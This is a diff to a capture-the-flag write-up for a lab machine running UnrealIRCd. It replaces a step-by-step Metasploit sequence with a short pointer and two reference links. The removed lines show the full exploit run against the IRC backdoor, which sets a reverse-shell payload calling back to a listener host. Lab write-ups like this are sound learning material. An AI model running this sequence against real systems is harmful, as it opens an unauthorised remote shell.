@@ -138,17 +138,8 @@ export SHELL=bash
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/591f1bad-ad38-45d0-b1fa-b39b769700d5)
 
 ### Method 3
-+ `msfconsole -q`
-+ `use exploit/unix/irc/unreal_ircd_3281_backdoor`
-+ `set RHOSTS 10.10.10.117`
-+ `set RPORT 8067`
-+ `show payloads`
-+ `set PAYLOAD cmd/unix/reverse`
-+ `set LHOST 10.10.14.6`
-+ `set LPORT 4444`
-+ `exploit`
-
-
++ Try to exploit with metasploit.
++ Check [1](https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/)  [2](https://pentesthacker.wordpress.com/2021/01/10/hack-metasploitable-with-unrealirc-backdoor/)
 
 
 ## Privilege Escalation: from 'ircd' to 'djmardov'
